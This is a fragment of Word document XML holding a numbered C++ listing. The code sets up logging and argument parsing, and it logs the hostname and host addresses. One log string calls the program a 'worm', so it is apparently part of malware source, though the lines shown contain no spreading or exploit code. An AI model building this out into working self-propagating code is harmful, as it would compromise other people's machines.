          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>149                 std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cerr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Unable to find place to write log"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>endl</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150                 exit(255);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>151         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">152         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">153         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">//TODO check </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> free space</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">154         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>155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filename = Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getCurrentTimestamp</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".log"</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156         filename = Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>makeSafeFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(filename);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">157         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">158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directory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filename;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>159 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">160 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">161 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">162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163 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>envp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Non-standard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and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not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POSIX.1 compliant.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If</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anything</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were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to</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modify</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the</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969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>env</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this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would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have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pointed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to</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stale</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">164 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> *                     data</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so</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instead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use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the "extern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char **environ" pointer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care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of</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969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>unistd.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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165 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>*                      For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this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program</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we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use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a</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helper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function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in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the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Utilities</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class.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">166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167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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>main</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argc</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168         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Choose a location for the log file</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">169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logPathname</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findSuitableLogLocation</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170         logger = </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Logger(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>logPathname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171         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>172         std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Logging to "</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>logPathname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;&lt; std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>endl</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173 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>174         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Beginning execution"</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175         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Log written to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logPathname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176         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>logUsefulDebug</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argc</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177         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Version hash: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getVersion</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178         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Hostname (according to OS not DNS) is "</w:t>
      </w:r>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getHostname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179         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Host addresses on machine:"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180         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>logAddresses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181         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">182         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">183         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Parse arguments</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">184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ArgumentParser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>::parse(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>argc</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argv</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185                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Error and already logged so leave</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">186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255;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>187         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">188         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>189         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Local system time for worm is "</w:t>
      </w:r>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getCurrentTimestamp</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190         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
